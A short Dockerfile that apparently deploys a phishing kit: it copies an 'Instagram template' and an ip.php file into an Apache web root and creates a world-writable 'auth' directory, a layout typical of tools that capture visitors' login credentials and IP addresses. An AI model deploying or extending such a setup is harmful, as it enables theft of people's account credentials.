FROM php:apache

# Copy your Instagram template
COPY .sites/instagram /var/www/html/
COPY .sites/ip.php /var/www/html/

# Create auth directory
RUN mkdir -p /var/www/html/auth && chmod 777 /var/www/html/auth

# Enable Apache modules
RUN a2enmod rewrite

EXPOSE 80

# Start Apache
CMD ["apache2-foreground"]
